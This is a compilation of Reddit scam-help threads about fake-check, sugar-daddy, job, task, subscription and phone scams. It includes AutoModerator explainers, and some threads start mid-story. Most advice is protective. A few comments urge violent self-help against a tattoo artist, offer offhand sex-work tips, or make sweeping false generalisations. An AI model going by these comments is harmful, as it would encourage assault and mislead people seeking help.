 ‚ÄúPayPal Credit courtesy reminder. Make payment. paypal.com. 8443734961. FreeMsg: Synchrony Bank. To opt out reply STOP.‚Äù

Now obviously, my first thought was scam, so I ignored it, but they kept coming, and I did some digging and found out the number is legit. I did not click on the link in the text with the number, but called myself after double checking. I have called and emailed and had long conversations with both PayPal credit, and synchrony, and even PayPal itself just to be sure. PayPal credit and synchrony have insured me that just as I thought, I have never had PayPal credit. They double checked with my Social Security number, again. I was sure I was speaking with the actual company before giving it, and I‚Äôve never had a credit card in my life. They were very kind to me on the phone and told me that it‚Äôs most likely a scam, but as there‚Äôs no links in the text, I don‚Äôt think it can be can it? 

For context, I get a lot of text and phone call specifically asking for two people, Roberta and David. I‚Äôve been getting those kind of calls and texts for years now. 

Long story short, is this a scam, or is it what I‚Äôm likely thinking, the number I have used to belong to someone who had an account, or someone used my number to create one. I don‚Äôt think I‚Äôm in any trouble because there‚Äôs no credit link to me, just wondering if it‚Äôs a scam and especially wondering just how to get it to stop Because it‚Äôs quite annoying

- Got a PayPal credit scam email today. Seems to be the newest scam going around after last month‚Äôs ‚ÄúUSPS delivery fee‚Äù scam.

Edit: I see you are getting texts. I have gotten similar emails.
- !refund
- Hi /u/Flaky_Law2653, AutoModerator has been summoned to explain the Refund scam.

Refund scams usually start with a spam email about a fake transaction, although they can also be sent through SMS or any other messaging service. The message will provide you with a phone number to call if you want to cancel the transaction, and if you call the scammers will try to get you to provide credit card or banking information in order to receive your refund. Scammers have been taking advantage of Paypal's invoice system to send out realistic scam emails through Paypal itself, here is a news article about that technique: https://krebsonsecurity.com/2022/08/paypal-phishing-scam-uses-invoices-sent-via-paypal/. Here is a Snopes article regarding the Norton variant of this scam: https://www.snopes.com/fact-check/norton-email-renewal-scam/

- Scammers will ask the name of your bank often to make sure their fake check is not from the same institution. Remember to never accept or deposit a check from a stranger. Dont do financial favors for them too.
- How is someone randomly messaging you to be their "sugar baby" chat buddies not shady for you?

As already mentioned, it's the sugar scam.

In fact, anyone who randomly offers you money out of nowhere on the internet is a scammer. Just remember that there's no free money on the internet.
- !sugar

There is no sugar without in real life sex. This is always going to be a scam. (!fakecheck from the sounds of it)
- always a scam. nobody is giving free money.
- You're a broke college student who not using her logical through process.

On what planet would something like this - a total stranger reaching out randomly on a social media site and offering to *give* you money?

So you give them your banking information ( red flag 1 ) and they will send you a "check" ( likely fake or stolen -red flag 2 ), which you deposit. They, during the wait on the check clearing, they will ask you to send money back because they sent too much, or some story ( giant crimson flag 3 ).

You send them money from your account. Then the check bounces and you're out everything.

Not really a logical, realistic scenario, right?
- > they offered me money and specified our relationship would be platonic.

***When you have a ‚Äúsugar daddy‚Äù, you are exchanging sex for gifts/money.*** Being a ‚ÄúSugar baby‚Äù is sex work. You are a prostitute but instead of servicing strangers, you service a consistent ‚ÄúJohn‚Äù.

- That‚Äôs the most common scam on any social media. I get a spam message like this every other week
- "Sugar baby" without IRL interaction is called Only Fans. If that's your thing, get an Only Fans account. If you were to somehow find a "special  one-on-one online-only relationship" (and you trusted them not to blackmail you later) get a Bitcoin wallet (via Coinbase, etc.) and require your benefactor to fund you that way only.
- If you want to try out sex work I'd suggest starting slowly, like striping.
- They don't need your bank name to send a check, nor yours- if you're going to entertain them at all, tell them to send a check made out to "cash"
- [removed]

- Hi /u/1Cattywampus1, AutoModerator has been summoned to explain the Sugar daddy or momma scam.

Sugar dad/daddy/mom/momma scams are [very common](https://www.fraud.org/sugarbaby_alert) and usually come in two varieties: fake check style scams, and advance-fee scams. Fake check style scams involve the scammer making a fraudulent payment to you that will later be reversed, and then you making some sort of payment to the scammer that will not be reversed. Common examples include the scammer sending you a fake check and asking you to buy gift cards, or to send money via Western Union, or to purchase Bitcoins. Another common example involves the sugar scammer offering to pay your bills, or offering you banking information that you will use to pay off your bills. These bank accounts are stolen and the innocent victim will reverse the charge when they notice the fraud.

The second variety of sugar scammers use advance-fee scams, where they offer you money but require you to pay first. They may ask for you to pay them to prove that you are loyal, or they may require you to pay a processing fee. It's common for sugar scammers to send spoofed emails that look like they came from services like PayPal or CashApp that will inform you that you have received money, but that also ask for a processing fee before the funds are released.

In the real world, sugar babies are sex workers that engage in in-person sexual encounters with their clients. **We do not recommend that people try to be a sugar baby, but if this is what you are looking into, check out the following subreddits for information on how to be safe: r/SugarLifestyleForum/ and /r/SexWorkers**.

- Hi /u/1Cattywampus1, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

Title: My great uncle got scammed today, please keep the awareness spread to your older relatives
Body: I was not expecting to get a call from my grandmother in hysterics telling me that my great uncle got a call from the ‚Äúcartel‚Äù that they had his daughter and were demanding $10k for her to be free. They told him that they knew his address, told him to stay on the line and don‚Äôt hang up or else who knows what would happen, all the scare works. He said he heard his daughter‚Äôs voice in the background, but I believe it was due to his age/stress with the situation that any feminine voice could be equated as such. 


Long story short. He wired around $3.5k to these pos and they told him that was ‚Äúgood enough‚Äù and that he could get in touch with his daughter again. She was at a Starbucks getting coffee. 


I knew this was a scam the moment my grandmother brought up the ‚Äúcartel‚Äù and ‚Äúsending money‚Äù because I‚Äôve heard of this type of scam before. I told her as such, but by the time my grandmother went to call her brother it was already too late and the money was already sent thru a wire


That‚Äôs all the details I‚Äôve managed to get out about it. I‚Äôm assuming the money is gone for good as my great uncle is ashamed and scared for losing that much money (he lives in cali and is the only working figure in the house), I wish I  could of educated him before but I rarely speak to him outside of visiting (which hasn‚Äôt happened in years since we moved across the country). I told my grandmother that this should be a lesson for her as well, that the moment anybody starts to threaten her with our lives about money that she needs to hang up and contact us directly. I told her the ‚Äúwe don‚Äôt negotiate with terrorists‚Äù type of thing. We also agreed on a ‚Äúpassword‚Äù type of deal that if something scary like that is called then that word *must* be said in the conversation for it to be legitimate. 


I‚Äôm just at a loss right now. I guess I just needed to vent. I hate to say it but I‚Äôm glad it didn‚Äôt happen to my grandmother as I know she probably would have fell for it too. Fuck these pos, I‚Äôm so tired and angry.

- The only solution is to get people to stop answering the damn phone. If they absolutely must, then they have to take EVERYTHING the other person says with a giant grain of salt. This goes for older people especially.  They were trained at a young age to pick up every call, and take every person on that phone seriously.
- Yeah they‚Äôve gotten extremely inventive these days. Both my grandparents got calls from ‚Äúme‚Äù and they all believed it was legit. One scammer told my grandma I went to Mexico for a bachelor‚Äôs party and got arrested. So I needed $6,000 bail or I‚Äôd stay locked up forever. 

Another called my grandfather and said I had been kidnapped. People look up the age of someone, call them and say ‚ÄúGrandma or Grandpa!‚Äù The rest can be ad-libbed. Luckily for my grandparents they couldn‚Äôt care less about my well being. I‚Äôm sorry your family went through this ordeal.
- There is a high probability they will now target him for other types of scams since they succeeded the first time. They may share his contact info with other scammers, as a promising lead.
- Happened to my SIL. She was on her way to get the money from the bank. $1500.00. Another relative called her daughter and she was on a flight from Los Angeles to New York, perfectly safe. $1500.00 that the scammers didn't get.
- Yup. It‚Äôs your damned phone, you DO NOT have to jump up just because it is ringing. A legitimate caller will leave a voice mail. Why would you bother with anyone else?

I am 77, and I figured this out 40 years ago.
- So I understand that you are not very fond of your grandparents?
- This is what I told my grandmother too. Hopefully my uncle‚Äôs daughter knows too about what happened, but I haven‚Äôt had an update with that yet.
- Naw, they‚Äôre cool. My mother‚Äôs parents divorced and married into other families. Then my mom moved to the East Coast. So I‚Äôm a grandkid in name only. Socks for every Christmas kinda deal.
- Sorry to hear that!

- Sounds like a !Task scam, OP. Legit recruiters and employers do not contact you via WhatsApp, so just block and ignore.
- Scam. You mentioned that you don't have a resume, but their message says they reviewed your resume. Which means that the scammers are sending out hundreds of these to random people, using robocall systems. They hope that a few people who get these texts have been looking for a job, and will contact them.

There is no job, it's a lie, they want to take your money. For you, at this time, it probably doesn't matter what the scam is (there are several types of job scams). Just ignore and delete the messages.

- Hi /u/Belle_Corliss, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

Title: Scammed by a tattoo artist üò≠
Body: In December, I went with my husband who was getting a tattoo of a dragon from this very talented artist. The dude seemed super nice, invited us up to his "home studio" in his apartment, we even shared snacks with him. When we went to pay, my partner sent the money to the account he requested using zelle, but after he said the money was not showing up in his account. I was immediately suspicious because it was shown as delivered from my partners account. I told him it looks like a problem with his bank, and he said his bank was inconsistent, and he would call if they were open. I was under pressure and sent the payment once more through Venmo, now 2x 1150 was missing from my partners account. He recommended we call our bank in the morning to figure out what the problem was, and he would do the same. 

Over the next two months my partner spent his lunch breaks calling his bank until ultimately, they confirm the transaction cannot be refunded because the transaction was delivered. The tattoo artist says he called his bank, but claims they said the same. The entire time he was acting like it was our responsibility to call his bank.

Today we tried calling his bank, they weren't able to give us a lot of info (because we are not the client) but they did confirm the transaction in question was received by an account under his name.

I sent him one last message explaining that his bank confirmed the money was received in an account under his name, and that we had plenty of evidence of paying twice from our bank. I guess this could be a genuine mistake on his part, but I can't help but feel like he has to be lying. 

Today we looked into the information we would need to bring him to small claims court. I think we have all the evidence we need, but I'm worried. He has a website and plenty of social media and other clients, but what if his name is an alias? We have his apartment address, but it's not an official business or anything (I'm sure he's licensed?). 

I just feel so stupid, I knew better than to send the money twice, I just didn't want to make the guy mad when he had been so nice to us üò≠


Edit: The tattoo guy must have seen I posted on Reddit using his name and Instagram. He called my husband in the middle of the night begging him to ask me to take it down, saying "my mom uses Reddit, reputation is everything". He offered to meet with my husband the next day, but my husband said he had to work and to just send him the money, he thought it sounded like a trap üòÇ. The next morning he FINALLY sent the full amount. just in time too bc the mods took down the post the same morning üôÄ. Thank you guys for the advice and sympathy, I know name shaming is bad but it saved me the trip to court ‚ù§Ô∏è.

**
- I'd be more worried about getting a tattoo for an unknown person in their home.
- ZELLE IS FOR FRIENDS AND FAMILY.¬† ¬† ¬†

IT EVEN SAYS SO ON THEIR WEBSITE.


Not business deals.


I posted this earlier from zelle's website.

"Zelle¬Æ is a fast, safe and easy way to send and receive money with friends, family and others you trust.."
- Are you sure he is the tattoo artist he claims to be? Is it possible that he stole pictures of the tattoos "he's done" from other artists and made a fake Instagram profile?
Maybe he paid to have people follow him/like/comment on his photos 


I find it really hard to believe that a truly reputable and somewhat famous/popular tattoo artist would be working out of his home and not at a professional shop


But yeah, sounds like small claims is the way to go, hopefully you get your money back!!
- I hope the snacks were worth the $1150. 

Have you filed a police report?
- Yeah Small Claims it is. It seems odd that someone with a public facing (social media and a website) business would scam someone like that seeing as you can easily put him on blast and let others know not to deal with him. Maybe he‚Äôs just scatter brained or kind of a dumbass and didn‚Äôt see the money in his account? Is that possible?
- Post what happened on Google reviews
- You don't need to feel stupid. Scammers build on trust. Just shows you are a good person. But, on the other hand, best to learn from our mistakes. But, your bank can confirm the details. If a scammer like Mr. Tattoo Artist or is it Dude Scam Artist says that they didn't get the money, show them the proof that the money was sent to the place they asked for. Don't send money again until you get your money back.
- Seems very shortsighted on his part. Guy is talented, but you can (and should) go on all the review sites and warn people that he's not reputable. That will cost him more than whatever money he squeezed out of you.

Small claims court may work - it's worth a try.
- send in the paper work .he'll be served papers        if hes smart he'll pay you back, im sure he dont wanna lose  his licnese.( if he has one.) if not he wont be getting one anytime soon..for that sum of money. or his business or clinits
- I‚Äôm sorry you got scammed, but you did Zelle him twice‚Ä¶
- I hope you have texts or emails of your talks with the guy, try not to do anything over the phone so you have records of what he is saying and to prove it wasn‚Äôt meant as a tip, if he tries to claim that. 

Once you send the money and it says delivered, it‚Äôs between them and their bank. If you can prove it left your account, it‚Äôs their problem. 

If the guy won‚Äôt refund you the money after you send it twice, it is definitely a scam!
- If you'r in the USA, your state may have a consumer complaint board - it may be run under the state attorney general's office.  I was scammed once and reproted it to my state attorney general, they contacted the business and made him reimburse me.  He was already on their radar due to past complaints.  In short, you should report this to SOME kind of policing authority just to create a history of how this busimess operates, if nothing else.
- It seems weird the tattoo artist would scam from his home and keep speaking to you. What is the point (not saying he's not). When you called the bank, did you just give the phone number or did you give them the actual artist name? Maybe he stupidly gave you the wrong number. But either way, small claims court is the way t ogo.
- [removed]
- Why did the mods take it down?
- Wow, what was this guy thinking?  Getting a tattoo is a leap of faith. You have to trust the artist inking you. Of *course* ripping off one customer means that‚Äôs your last customer.
- Court is a fools errand. 
The guy is not going to pay you back.
You need to go beat his ass and take something worth $1150 from him. If you can't do it yourself, bring some friends or hire someone.
- Yeah that's just begging to get Hep C.
- As long as they open the brand new needles in front of you, you should be fine
- I‚Äôve gotten a tattoo from actually a fairly well-known artist, and she did it at her home. Why should tattoo artists not get the benefit of home office? ;-)
- People fall for fake artist scams all the time. The person just posts links to the actual artists accounts so people think it‚Äôs legit but will always text or go off platforms thinking it‚Äôs personal rather than business.
- I met him tho, he's the same guy. He posts him doing tattoos on his story all the time üòÇ.
- They shared THEIR "snacks" with him, do you want them to be triple-plooked?
- This is a civil matter. Police won't get involved. They knowingly sent it twice. Small claims are the only option.
- üòÇüòÇüòÇ
- $1150 for a tattoo?¬†

Seems excessive
- I would wager there's a reason he's running his shop out of his living room instead of a business location. That should be a red flag.

I would say walk away. All this cat will say is something like 'it was a tip.'¬†

I would also suggest avoiding living room tattoo shops entirely.
- I think his social media portfolio is stolen images
- Start the small claims proceeding (shouldn‚Äôt cost much). Let him know that this the only avenue that is left to you at this point. That in itself might sway him to magically find that duplicate payment and send it back to you. If he doesn‚Äôt, well, you can cross the bridge of trying to garner business income later.
- I am sure a home Tattooer is worried about Google reviews
- Not really, as other commenters have pointed out‚Ä¶. There is a reason dude is operating out of his kitchen instead of a business location. Hint - it‚Äôs because he lies and scams people out of money. He probably also floats bad checks and doesn‚Äôt pay his bills.

Small claims is worth a shot, but you may spend more than $1100 trying to enforce a judgement.
- That's why I was so confused, he has a bunch of clients in this area, he can't possibly get away with it. I was very interested in getting a tattoo from him, my husband had a difficult request and he handled it perfectly. (He wanted a tattoo of a feathered dragon, like Quetzalcoatl).

When we called the bank, we gave them the transaction number our bank gave us, the account number he had claimed was his, and his name. I'm really surprised they gave us any information at all.

- True facts.
- There's definitely situations where it's not a problem. I got my gand done by a guy in his living room and he pulled everything out of sealed packages and was very clean. His shop downtown flodded a few months prior. But like I had an extensive conversation with the guy before I just went to his house. So like, do your reaearch
- 16000 cases a year in the USA, 6% (920) could have been from infected tattoo needles but 2/3 of those were also subject to other risk factors.  So yeah, may as well worry about being hit by lightning while you're at it.
- Not really. For a good artist and a decent sized piece that seems pretty standard. My partner had his upper arm done, 8 hours to complete, $1100.
- so weird but i see your update! Thankfully you got your money back! that's so weird he'd do that with such a big following. And twice! I'd also wonder how many others he may have done this too.
- May as well not play the odds and get your work done by a professional in a proper environment.

Title: Accidentally Sent Phone Number to potential Scammer. Am I already screwed?
Body: A friend on instagram messaged me on their current account, not a new one, and asked if they could use my number to do a reactivation on their account. They asked for me to send them the link I get messaged.

Now, i only sent them my Phone Number, before I realised i probably shouldn't and deleted it. I haven't recieved any Message of a Reset Password Link yet. Is anything bad going to happen to me or am I all good? Also keep in mind, this isn't a situation where its an alt account that just copy and pastes their profile pic and all that, it was the original account i'm friends with and have been following for years.

- Remember phone books?

Where everyone could look up everyone else's number?

If all they have is your number the worst they can do is try again later with a different scam.
- You're fine. Nothing they can do with just your phone number. As long as you do not send them any codes you receive.  
Never send those to anyone. Never.  
But they were trying to steal your account.  
Using your phone number to reset their account does not make any sense. It's linked to your account, not theirs.

Title: CARTA job scam - anyone heard of this?
Body: I recently posted in a local Facebook group that I was in need of a job. A local woman replied, telling me that she worked for a company named CARTA. She sent me lots of detailed info pertaining to this position. She then gave me a code to use for the Microsoft teams app that would supposedly put me in contact with the hiring managers. 

Once in the chat with CARTA, the person on the other end informed me they were Peter Walker. This could not have been true. They then conducted a short interview with me sending voice messages for my answers. Then, they sent me a picture of the equipment I was supposed to receive for this ‚Äúpayroll assistant‚Äù job. The website they sent me was officialcarta.com which is not the real website, and full of typos/random capitalization. These people never even saw my resume. 

Then of course, they claimed the only way to pay me was by electronic check and they needed my bank username and password/account info so they could get into my account and deposit it. Just ridiculous, must have thought I was born yesterday. No legit company hires anyone with out an interview/resume, within a day, after 5 pm, without seeing you on a video call, etc. I‚Äôve never heard of such a thing for ‚Äúpayment method.‚Äù I declined the offer and blocked them. If anyone else out there is suggested to this company, please take my experience into account and block them right away. CARTA is a legitimate company, but they have scammers impersonating them.

- I mean anyone asking for your username / password is automatic 100% scammer. No other details matter.
- !fakecheck scam. Very common scam. There are no entry level remote jobs EVER.
- It's not really about the company, but the methods. 

A new company with a new name will be created tomorrow, but doing the exact same thing. 

It's important to recognize the signs (which you did well OP) moreso than any individual company name.
- Thank-you fir posting, this is a variation of a common fake check job scam, but with interview via voicemail. Did I understand that correctly? How did you ask questions, via text message?

Glad that you saw red flags and didn't lose money.

> These people never even saw my resume. 

>Then of course, they claimed the only way to pay me was by electronic check and they needed my bank username and password/account info so they could get into my account and deposit it

People do fall for this scam, every day, sadly.
- Most job offers for remote or work from home jobs are scams. There are so many job scams out there, they pretend to give you work like Data Entry, Data Optimization, posting reviews of hotels, or Virtual Personal Assistant, or "inspecting and re-shipping packages". But what the scams really do is steal your money. **Some people have lost thousands to job scams. Some people have gone to prison for getting involved with illegal activities, like money laundering or parcel mule.**

Some red flags for job scams:

- contacted  on WhatsApp, Instagram, Telegram, or other social media

- vague impersonal info on their emails to you, like "Dear Applicant"

- interview by text only

- hired right after interview, or hired without interview

- the pay is much too high for the job tasks (US $30 per hour for simple stuff that the average 12 year old could do)

- you have to pay them for something, or "invest" your own money

- they want to send you a check for you to buy equipment (check is fake, you lose money)

- they want your bank information including user name and password

- job involves re-shipping packages (parcel mule)

If you're currently looking for a job, spend a little time here to get familiar with !job scams so you recognize the signs.
- "CARTA job scam - anyone heard of this?"

You're asking the wrong question. These scammers create names by the hundreds every day and then change them every week just so that no one will be able to answer this affirmatively. 

Instead, if you ask if any of us have heard of a job scam where:
 
Employees are required to do weird tasks and then are required to send in their own funds to receive funds, or where employees must deposit an "echeck" and then purchase equipment from a specific supplier, or where employees must act as financial middlemen (as a money mule), or...

And then we could say, "Yes, we've heard of this." You see, it's the setup and the process that matters much more than the ever-changing name.
- >Then of course, they claimed the only way to pay me was by electronic check and they needed my bank username and password/account info so they could get into my account and deposit it.

Ha! Absolutely not! No one, not even your own mother, needs your bank login information.
- Yep, job scam!

BTW, both of the hiring managers are named Peter.  

Peter Walker.        And

Peter Texas-Ranger.
- !whois officialcarta.com
- Wow, just heard about this scam. That's insane to ask for your banking details.
- Yeah these scammers constantly change company names so it's not a CARTA scam, just a Remote Job scam.

Just one of the many messages they sent me trying to convince me this is legitimate.
- They also only need the routing and account number of your checking account to make a deposit NOT you account name or password..
- Hi /u/RacerX200, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

- Good point. I‚Äôm 21 and have no experience in online jobs, I feel stupid for even entertaining this. At least I didn‚Äôt give any bank info ü§¶üèº‚Äç‚ôÄÔ∏è
- Agree with everything you said, but is there some value in burning the company name? It could come up in the next persons search before they get scammed. Maybe it costs the scammers something to lose the fake site they had set up and need to create a new one? Or do you think the site builders and maybe even the person that reached out to OP on FB and also getting tasked scammed and paid in fake check or crypto?
- Yeah so, we were chatting on teams. I texted any questions, the only voice messages I sent were answering their interview questions. The woman who recommended me the job on Facebook had a totally real and legit profile, so I‚Äôm concerned as to if she‚Äôs been hacked or something.
- Yeah, they did exactly that. Wanted me to buy the equipment with the money they sent me.
- Hi /u/Theba-Chiddero, AutoModerator has been summoned to explain the Job scam.

Fake job scams come in many different varieties. The scammers will usually conduct interviews over Whatsapp, Telegram or Teams. They will offer high wages for the work being done, oftentimes with wildly varied wage ranges by hour, and they will \"hire\" you by telling you that you are hired, rather than going through the normal process that a company takes when hiring an employee in your country.

If they mention anything about a check or about receiving and sending out transactions, it is a [fake check scam](https://www.consumer.ftc.gov/blog/2018/09/anatomy-fake-check-scam). If they say they will cut you a check so you can buy equipment for remote work, it's a scam in which they make you purchase equipment on a fake website under their control, with your own card, and when the check bounces in a few weeks you're left holding the bag (and the equipment never comes)

If they mention anything about receiving, processing, or inspecting packages, it is a [parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam).

If they ask you to purchase items up-front, ask you to pay a fee in order to be hired, or ask you to purchase gift cards, it is an [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam). If they mention Bitcoin ATMs, [it's always a scam](https://coinatmradar.com/blog/avoid-scams-dont-use-bitcoin-atm-when-someone-asked-you/).

If the job involves posting advertisements on Facebook Marketplace, Craigslist or eBay, they are using you and your account to scam other people (especially if it's rental listings). Thanks to redditor AceyAceyAcey for this script.

- Oh sure, put the company name on blast. They deserve it. But these companies are so... ephemeral that I wouldn't want folks to let their guard down if they see a new company that no one has talked about yet. 

A lot of posts in these scam subs include phrases like "Google didn't give me much, but the site looked legit". So recognizing the scammy methods goes a long way.
- lol I wasn't saying the company (Carta in this case whoever that is) "deserves it". They did nothing wrong just cause some scammers are spoofing them. Just that there could be some cost in setting up these scams and burning them is a small way to fight back. Certainly educating people to be weary of the methods they often employ is much more effective, you're doing the lord's work here

- From what I gather from my extensive (nonexistent) r/scams research, the more sophisticated job scams will impersonate actual companies so that if the marks do superficial background checks they might avoid getting blown.

Of course I clicked SKIP, and instantly got charged $29.99 on my card.

Reached out to customer care and they pasted a well worded clause that ‚ÄúI was shown the correct amount and chose to pay consciously‚Äù

It was almost as if they had this clause ready for anyone who asked this question (which probably happens a lot). It was even mentioned in their FAQ ü§£

And there was no way to cancel the subscription on their website (their chatbot didn‚Äôt work), and the only way was when I emailed them.

Anyway, I reported the txn to my credit card and blocked my card. That txn is under review, hopefully I get my money back.


Edit: I found that the parent company is cerebrum IQ



UPDATE: I emailed them that I posted about them on Reddit. I instantly got a reply that they‚Äôll be refunding my money. Let‚Äôs see if they actually refund.

- If you take an online IQ test, you have already failed.
- * Next I was shown two buttons (capital in large AF print and small letters were minuscule print)‚Äù: ‚ÄúACTIVATE free trial‚Äù or ‚ÄúSKIP free trial and start paid trial‚Äù

Plot twist: Either option results in your card getting charged immediately. No really, this is their business model.

- This just happened to me but I used a PayPal card with $5. I couldn‚Äôt cancel cuz they made it glitch out so I just changed my card number and problem solved ü§£
- I'm not sure whether it was the same web site or not, but I recall other Redditors coming to this sub to report they had taken an online test and got stuck with an expensive subscription.  Tricking unwary users is clearly the business model for some sites.  The only advice I can offer is to avoid dodgy web sites, read the fine print, and don't make payments with your debit card (where you may have less protection).
- What email did you use to contact them? I can't find anything other than their facebook
- I used a virtual card which I can delete at a moments notice. So i too paid the 99p. But they wont get anymore from me. 

The only official IQ is a Mensa IQ in the UK and you have to go to a facility to get it. 

What did you get on the site, I got 137 lol.
- thanks for sharing this

i too got trapped with an additional charge.

19.99 usd immediately after the 0.99 usd free trial charge.

i am texting paypal and the bastards right away
- Any luck ? Just fell for the same shit. I didn't even select anything , it automatically took away ‚Ç¨29.99 from my card (+ the additional 0.99 at the same time).
- Lol yeah true I failed ü§£
- The real IQ test üò≠
- There's another site called "JustAnswer" that uses the same kind of model, says you just need to pay $1 and then tricks people who aren't paying attention into clicking an OK to pay $60
- Agreed. I paid with credit card so atleast I was able to raise a dispute.
- help@myiq.com

Even this was hidden under T&C etc
- I use monzo banking which lets you create virtual bank cards for dodgy online stuff. Revolut lets you do the same. Theres lots of variations of app based banks with this feature. May be worth opening one for future endeavours.
- 127 ü•π
- [removed]
- Thanks dude. I'm happy i read everything considering subscribing. It was so confusing and so much more complicated than neccesary. Got off with an IQ of 118 and $0.99 payment
- No I didn‚Äôt get the refund through the credit card dispute. The credit card company closed the dispute saying that the transaction was legit.

But then I emailed myiq threatening them that I made a reddit post about them, and will also tell my 10 friends to make more posts. And then they refunded the money to me ü§£
- Happy to have helped dude! I wish I had read that carefully

Title: Binance - Is it a scam
Body: Have I been scammed? I called the number that told me they were doing an investigation and would call me in 24 hours. Then they referred me to Trezor because I told them I was using Trezor. Trezor asked me to log into my Trezor account, I said it was too late, I would download and set it up later. They kept asking me how much credit I had in my account. I think it was a scam, what do you think? The only legitimate thing is that I got a message from the same number I got 2 years ago for Binance. Less

- Yeah it's totally a scam. Especially asking for how much you have so they know if they should focus on you.
- Yes, that was a scam text. They can spoof the sender to be the same as Binance‚Äôs real number, hence it got sent to the same thread.

Title: "Legal Services" call scam? 833 area code
Body: Someone from "Legal Services" called with caller ID 00000 and wants me to call back at a number with the 833 area code

Sounds like the makings of a scam to me? Just like the old "Card Services" people calling? If this was a real company, they'd give the company name instead of just "Legal Services".

I guess it could be some shady debt collector, but I don't have any debts. Maybe an old parking ticket or something that got missed? Aren't debt collectors required to identify themselves?

Has anyone heard of "Legal Services" or "Card Services" just being a generic scam that leads into other scams, for example claiming your bank account was hacked and you have to transfer the money to them for safekeeping?

- !debt
- Anyone calling you and saying they are a cop, lawyer, banker, etc should be viewed with outright suspicion. 

Personally I would not call them back unless there was a clear reason you could independently confirm without calling them back.
- Fake debt collector scams have exploded in popularity recently: https://www.reddit.com/r/Scams/comments/1i7fqd8/possible_phone_scam_from_law_office/

Ignore them unless you actually get something in the mail. You are under no obligation to call them back.
- Hi /u/CIAMom420, AutoModerator has been summoned to explain the Debt collection scam.

If you are positive the debt you're being accused of has never existed or has already been resolved, this is a scam. Keep in mind that companies can change names and debts can be sold, so not recognizing the company you owe isn't necessarily proof of a scam; you should call the company where the debt originated to confirm a debt exists. Be mindful of debt collection laws in your state or country before engaging in any conversation with a debt collection agency, to avoid being liable for debts that may be outside their statute of limitations for collections.

Like legitimate debt collectors, scam collectors may have access to your SSN, address, names of your contacts, etc. from a data breach. They may be calling your family, friends and employer relentlessly with invasive or embarrassing questions about you. They may send you threatening letters, emails and texts that state you will be sued or arrested if you don't immediately pay them X amount of dollars. These are scare tactics to rush you into paying before you have a chance to consider the situation logically. Instruct all of your contacts that this is fraud and to block the calls. If the scammers know a lot about you, you have potentially been involved in a serious data breach.

Here's a guide from r/identityTheft that covers the basics of credit freeze, IRS pins, even replacement SSN and police reports: https://www.reddit.com/r/IdentityTheft/comments/pqb1za/identity_theft_recovery_101/

You need to freeze your credit through the credit bureaus: https://www.reddit.com/r/IdentityTheft/comments/uvv3ij/psa_freezing_your_three_main_credit_reports_is/ and freeze your debit line with Chex Systems https://www.chexsystems.com/security-freeze/place-freeze

Report correctly referenced documents (SSN, drivers license, credit card) as stolen to the respective agencies. If you are unsure of how to move forward, request guidance from local law enforcement. Credit to user l0john51 for this script.


**
- They didn't say anything, just "Legal Services" which again, is suspicious enough on its own.
- Yeah. Don‚Äôt call them back. If it‚Äôs real, they will find a way to contact you. And it‚Äôs not real. It‚Äôs a debt collector.
- But I don't have any debts....?
- Doesn‚Äôt matter. Debt collectors are all scam artists. They will find a way to scare you into paying them for something.

- Don't accept bank transfers or checks from strangers. Too many scams, and you can never be completely protected because the whole source account could be taken over by a scammer sending someone else's money. 

Stick to a platform that provides dispute resolution like PayPal goods and services. Or even better something like fivrr that has escrow.
- Hey OP, congrats on getting back on your feet. That's really excellent, and it's good you're being cautious here.

